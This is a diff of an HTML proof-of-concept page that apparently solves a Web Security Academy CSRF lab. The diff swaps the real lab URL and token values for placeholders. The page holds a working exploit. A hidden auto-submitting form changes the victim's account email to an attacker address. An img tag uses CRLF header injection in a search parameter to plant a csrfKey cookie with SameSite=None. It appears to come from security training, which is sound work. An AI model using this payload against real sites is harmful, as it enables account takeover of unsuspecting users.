@@ -1,11 +1,11 @@
 <html>
 	<body>
 		<iframe style="display:none" name="csrf-iframe"></iframe>      
-		<form action="https://0aec00a1036460db8193707f00920027.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
+		<form action="https://xxxxxxxxxxxxxxxURLxxxxxxxxxxxxxx.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
 			<input type="hidden" name="email" value="test@attacker.com" />
-			<input type="hidden" name="csrf" value="OGJmLKgqIk6lEzqxfP2DIHuuXXQldebE" />
+			<input type="hidden" name="csrf" value="xxxxxxxxxxxxxxCSRFxxxxxxxxxxxxxx" />
 		</form>
-		<img src="https://0aec00a1036460db8193707f00920027.web-security-academy.net/?search=%0d%0aSet-Cookie:%20csrfKey=EOlXWnW2TnlikD9USByWTs8nWw6L3tSq%3b%20SameSite=None" onerror="document.forms[0].submit()" />
+		<img src="https://xxxxxxxxxxxxxxxURLxxxxxxxxxxxxxx.web-security-academy.net/?search=%0d%0aSet-Cookie:%20csrfKey=xxxxxxxxxxxxCSRFKEYxxxxxxxxxxxxx%3b%20SameSite=None" onerror="document.forms[0].submit()" />
 		<script>
 			document.getElementById('csrf-form').submit();
 		</script>
